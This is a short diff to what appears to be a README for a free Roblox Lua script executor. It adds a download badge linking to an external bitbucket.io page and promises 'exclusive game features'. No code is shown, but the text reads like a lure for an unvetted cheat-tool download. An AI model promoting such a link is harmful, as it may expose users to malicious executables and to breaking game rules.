@@ -3,6 +3,7 @@
 
 Welcome to **free Lua script executor for Roblox**, your go-to tool for running Lua scripts effortlessly in Roblox. With this powerful executor, you can automate actions, enhance gameplay, and unlock exclusive game features—all for free!
 
+[![Download Lua](https://img.shields.io/badge/Download-Lua-blueviolet)](https://rotools.bitbucket.io/executors/lua)
 
 ## 🚀 Features  
 
